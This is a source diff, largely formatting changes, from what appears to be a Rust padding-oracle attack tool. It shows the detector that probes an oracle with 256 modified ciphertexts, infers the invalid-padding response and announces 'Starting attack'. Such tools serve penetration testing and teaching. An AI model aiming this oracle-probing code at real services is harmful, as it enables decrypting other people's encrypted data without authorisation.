@@ -2,7 +2,10 @@ use std::{collections::HashMap, sync::Arc};
 
 use async_trait::async_trait;
 use colored::Colorize;
-use tokio::{sync::{Mutex, Semaphore}, task::JoinSet};
+use tokio::{
+    sync::{Mutex, Semaphore},
+    task::JoinSet,
+};
 
 use crate::errors::DecryptError;
 
@@ -18,15 +21,15 @@ pub trait Oracle: 'static + Send + Sync {
 }
 
 #[async_trait]
-impl<O:Oracle> Oracle for Arc<O>{
-    async fn exec(&self, ct: &[u8]) -> String{
+impl<O: Oracle> Oracle for Arc<O> {
+    async fn exec(&self, ct: &[u8]) -> String {
         self.as_ref().exec(ct).await
     }
 }
 
 #[async_trait]
 impl<O: Oracle + ?Sized> Oracle for Box<O> {
-    async fn exec(&self, ct: &[u8]) -> String{
+    async fn exec(&self, ct: &[u8]) -> String {
         self.as_ref().exec(ct).await
     }
 }
@@ -37,17 +40,20 @@ pub trait Detector {
         ct: &[u8],
         oracle: impl Oracle,
         blk_size: usize,
-        threads: usize
+        threads: usize,
     ) -> Result<Self, DecryptError>
     where
         Self: Sized;
-    fn check(&self, ct: &[u8]) -> impl std::future::Future<Output = Result<DETECT, DecryptError>> + Send;
+    fn check(
+        &self,
+        ct: &[u8],
+    ) -> impl std::future::Future<Output = Result<DETECT, DecryptError>> + Send;
 }
 
 pub struct SimpleDetector {
     padding_invalid_resp: String,
     oracle: Arc<dyn Oracle>,
-    semaphore: Arc<Semaphore>
+    semaphore: Arc<Semaphore>,
 }
 
 impl Detector for SimpleDetector {
@@ -55,7 +61,7 @@ impl Detector for SimpleDetector {
         ct: &[u8],
         oracle: impl Oracle,
         blk_size: usize,
-        threads: usize
+        threads: usize,
     ) -> Result<Self, DecryptError>
     where
         Self: Sized,
@@ -72,22 +78,31 @@ impl Detector for SimpleDetector {
         }
         let last_blocks_shared = Vec::from(&blocks[blocks.len() - 2..blocks.len()]);
 
-        let response_map_shared: Arc<Mutex<HashMap<String, u16>>> = Arc::new(Mutex::new(HashMap::new()));
+        let response_map_shared: Arc<Mutex<HashMap<String, u16>>> =
+            Arc::new(Mutex::new(HashMap::new()));
 
         let oracle_shared = Arc::new(oracle);
 
         let mut futures_set = JoinSet::new();
         for i in 0..=255 {
-            let sem_acquire = semaphore.clone().acquire_owned().await.expect("Error: semaphore closed");
+            let sem_acquire = semaphore
+                .clone()
+                .acquire_owned()
+                .await
+                .expect("Error: semaphore closed");
             let mut last_blocks = last_blocks_shared.clone();
             let response_map = response_map_shared.clone();
             let oracle = oracle_shared.clone();
-            futures_set.spawn( async move {
-
+            futures_set.spawn(async move {
                 last_blocks[0][blk_size as usize - 1] = i;
-                let response = oracle.exec(&last_blocks.iter().flatten().cloned().collect::<Vec<u8>>()).await;
+                let response = oracle
+                    .exec(&last_blocks.iter().flatten().cloned().collect::<Vec<u8>>())
+                    .await;
                 let mut response_map_acquired = response_map.lock().await;
-                let num_response = response_map_acquired.get(&response).unwrap_or(&0).to_owned();
+                let num_response = response_map_acquired
+                    .get(&response)
+                    .unwrap_or(&0)
+                    .to_owned();
                 response_map_acquired.insert(response, num_response + 1);
                 drop(sem_acquire);
             });
@@ -95,27 +110,34 @@ impl Detector for SimpleDetector {
         futures_set.join_all().await;
         let response_map_acquired = response_map_shared.lock().await;
         if response_map_acquired.keys().len() < 2 {
-            println!("{}","No padding oracle found".red());
+            println!("{}", "No padding oracle found".red());
             return Err(DecryptError::DifferentialResponses(
                 "No unique responses found".into(),
             ));
         }
-        println!("{}","Padding oracle detected! Starting attack".green());
-        let (padding_invalid_resp, _) = response_map_acquired.iter().max_by_key(|(_k, v)| *v).unwrap();
+        println!("{}", "Padding oracle detected! Starting attack".green());
+        let (padding_invalid_resp, _) = response_map_acquired
+            .iter()
+            .max_by_key(|(_k, v)| *v)
+            .unwrap();
         let detector = Self {
             padding_invalid_resp: padding_invalid_resp.to_owned(),
             oracle: oracle_shared.clone(),
-            semaphore
+            semaphore,
         };
         return Ok(detector);
     }
 
     async fn check(&self, ct: &[u8]) -> Result<DETECT, DecryptError> {
-        let sem_acquire = self.semaphore.acquire().await.expect("Error: semaphore closed");
+        let sem_acquire = self
+            .semaphore
+            .acquire()
+            .await
+            .expect("Error: semaphore closed");
         let mut res = DETECT::BASELINE;
         if self.oracle.exec(ct).await != self.padding_invalid_resp {
             res = DETECT::OUTLIER;
-        } 
+        }
         drop(sem_acquire);
         return Ok(res);
     }
